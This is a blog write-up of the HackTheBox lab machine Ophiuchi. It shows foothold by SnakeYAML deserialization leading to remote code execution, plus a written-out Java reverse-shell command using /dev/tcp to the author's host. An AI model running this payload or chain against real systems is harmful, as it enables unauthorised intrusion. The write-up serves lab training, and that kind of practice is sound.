---
layout: post
title: HackTheBox Ophiuchi Write-up
---

<h2>Overview</h2>

Ophiuchi is a Medium-rated Hackthebox linux machine. I gain a foothold via an exposed yaml parser with unrestricted Java methods allowing RCE and a shell as the user tomcat. From there, exposed credentials allow a quick escalation to the user "admin". As admin, I discover I'm able to run a go script as superuser. The file loads scripts without specifying full filepaths, allowing script hijacking and command execution as root.

<h2>Initial Enumeration</h2>

Initial nmap enumeration reveals two ports open: SSH on port 22, and Apache Tomcat site on port 8080.

![image](https://user-images.githubusercontent.com/44827973/141241262-3409fed4-2bc0-47ef-9096-64f8af05ef93.png)

Heading over to port 8080 on a browser reveals an "Online YAML Parser":

![image](https://user-images.githubusercontent.com/44827973/141241523-217abe00-67cf-48a1-8c6f-5e6e8fa2ca59.png)

Testing some gibberish input and clicking parse, I get redirected to this security message:

![image](https://user-images.githubusercontent.com/44827973/141241584-ed9f2860-720c-4a9d-bca7-ee306f6a4d64.png)

Looking to find more clues, I look up the meaning of this strange word "Ophiuchi".

![image](https://user-images.githubusercontent.com/44827973/141242196-d6436a15-b45a-4b87-b2cb-1884505d54e5.png)

Conveniently, the first link shown when I search for "yaml exploit" returns a "SnakeYAML deserialization" blog entry.

![image](https://user-images.githubusercontent.com/44827973/141242358-9499465e-9c78-4bc2-a36b-c0ce616d1cff.png)

<h2>Exploiting SnakeYAML -> RCE</h2>

The blog author details a vulnerability in snakeyaml where, if user input is directly passed to a function, the application can be vulnerable to deserialization leading to RCE.
First on my local host I open an HTTP server, and then on the target website I test the payload provided by the blog.

![image](https://user-images.githubusercontent.com/44827973/141243558-c3d44771-864f-41d6-9e2e-8d4896256bec.png)
![image](https://user-images.githubusercontent.com/44827973/141243557-b5df5fcc-eed0-49bd-a661-e241da4b1e58.png)

The web server attempts to make contact with my host. Looks like the security message is either a trick or not up to date, as I can clearly get some form of execution going.

As explained by the blog, snake yaml can interpret Java class constructors in the yaml payload. Upon parsing the provided payload, snake YAML invokes ScriptEngineManager which as we can see attempted to access the "/META-INF/services/javax.script.ScriptEngineFactory" endpoint.

An exploit for this is provided in this github repo:
https://github.com/artsploit/yaml-payload

Upon parsing our yaml payload, the web server will look for the file "/META-INF/services/javax.script.ScriptEngineFactory" and read its contents. It will then attempt to execute the class file pointed to by this file. This exploit aims to abuse this by creation of a Java class file containing arbitrary commands which will force the web server to execute.

I created a folder tree similar to the exploit, in order for the server to locate the header file "javax.script.ScriptEngineFactory" and the class file containing the code I want executed. This is how it ends up looking:

![image](https://user-images.githubusercontent.com/44827973/141244440-6ec163f4-93c3-4d29-aefd-1128d5a6cf6b.png)

Within the javax.script.ScriptEngineFactory file, I specify the package and class I want executed, which will be my exploit.class within my snakeyaml directory:
`snakeyaml.exploit`

I copied the repo's .java file inside my package directory "snakeyaml", and make a modification of the comand to get a reverse shell. Note how I rename the package and class - Java classes need to be the same name as the filename.

![image](https://user-images.githubusercontent.com/44827973/141244687-06921bf0-9a95-4555-b60a-77fd952824ec.png)

Here is the reverse shell command I use:
`Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.6/443;cat <&5 | while read line; do $line 2>&5 >&5; done"});`

After modifying, I compile it with "javac exploit.java".

I start a reverse shell listener with netcat.
When I execute my yaml payload again on the website, I get a hit on my HTTP server with response 200 (meaning OK - there were no errors in retrieving the files). I get a reverse shell as "tomcat".

![image](https://user-images.githubusercontent.com/44827973/141245175-f9ae8a04-98c7-4c1e-8cb3-a12dd562560a.png)
![image](https://user-images.githubusercontent.com/44827973/141245182-168a32f8-a457-40eb-bdd6-0887d379aa24.png)

